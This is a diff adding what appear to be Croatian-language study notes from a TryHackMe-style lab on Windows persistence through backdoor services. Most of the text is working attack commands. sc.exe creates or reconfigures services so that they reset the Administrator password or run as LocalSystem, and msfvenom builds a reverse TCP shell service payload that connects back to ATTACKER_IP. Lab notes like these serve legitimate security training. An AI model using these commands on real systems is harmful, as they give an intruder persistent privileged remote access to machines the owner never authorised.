@@ -1,0 +1,49 @@
+Creating backdoor services
+
+Kreacija servisa koji rade neki zadatak (pazi na znak jednako!!!)
+
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+
+ili
+
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start THMservice2
+
+
+Modificiranje servisa
+Dohvacamo sve servise preko:
+
+sc.exe query state=all
+
+ili specifican preko:
+
+sc.exe qc ServisIme
+
+Primjer ispisa:
+C:\> sc.exe qc THMService3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMService3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2 AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\MyService\THMService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMService3
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\Local Service
+
+Na našem racunalu generiramo msfvenom paket koji ce se pokrenuti kao servis.
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=9001 -f exe-service -o rev-svc.exe
+
+I postavljamo kao servis:
+
+Kako bi promjenili specifikacije servisa trebamo izvrsiti ovu naredbu:
+
+sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+
+binPath se odnosi na BINARY_PATH_NAME, start auto znaci da ce se servis automatski pokretati, a obj predstavlja racun preko kojega se pokrece servis (pozeljan LocalSystem jer ima system privilegije)
